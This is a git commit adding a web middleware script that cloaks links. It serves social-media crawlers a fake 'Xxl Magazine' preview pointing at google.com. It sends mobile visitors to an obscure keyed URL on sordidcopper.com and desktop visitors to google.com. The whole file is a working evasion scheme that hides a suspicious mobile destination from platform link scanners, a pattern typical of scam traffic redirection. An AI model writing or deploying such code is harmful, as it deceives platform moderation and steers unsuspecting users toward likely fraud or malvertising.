a153d1e4e8046bfcbdf187df6809c81a0ab20d88
laotsakib <awanzour@gmail.com>
2026-09-08 01:55:02 +0500

    Create _middleware.js

---
+++ functions/_middleware.js
@@ -0,0 +1,38 @@
+export async function onRequest(context) {
+  const request = context.request;
+  const userAgent = request.headers.get('user-agent') || '';
+
+  // 1. Check for Social Media Crawlers / Bots
+  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);
+
+  if (isSocialBot) {
+    const htmlContent = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <meta property="og:title" content="Xxl Magazine">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Mon-Sep-07-2026/2dd1e746-455a-4b7f-809f-37a5f2ee443c/0477b08c-c9e9-4240-9db8-d0dd6f482d17.avif">
+    <meta property="og:url" content="https://www.google.com">
+    <meta property="og:type" content="website">
+</head>
+<body>
+</body>
+</html>`;
+
+    return new Response(htmlContent, {
+      headers: { 'content-type': 'text/html;charset=UTF-8' },
+    });
+  }
+
+  // 2. Check for Mobile Users
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+
+  if (isMobile) {
+    return Response.redirect("https://sordidcopper.com/bizfnac6c?key=1bc05c6ec51706e419d4c81d7f1e95b6", 302);
+  } else {
+    return Response.redirect("https://www.google.com", 302);
+  }
+}
